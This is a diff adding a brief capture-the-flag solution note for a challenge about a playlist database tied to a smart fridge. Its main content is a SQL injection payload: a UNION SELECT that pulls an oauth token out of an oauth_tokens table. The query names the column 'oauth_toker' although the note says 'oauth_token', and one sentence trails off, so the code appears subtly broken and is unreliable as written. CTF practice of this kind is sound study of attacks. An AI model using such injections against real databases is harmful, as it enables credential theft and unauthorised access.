@@ -1,0 +1,8 @@
+description: The gatekeeper software gave you access to a custom database to organize a music playlist. It looks like it might also be connected to the smart fridge to play custom door alarms. Maybe we can grab an oauth token that gets us closer to cake.
+
+
+get flag by SQL injecting the term and finding solution for the field of
+
+oauth_token at oauth_tokens
+
+query: shagun' UNION SELECT ( SELECT oauth_toker FROM oauth_tokens ),2 --
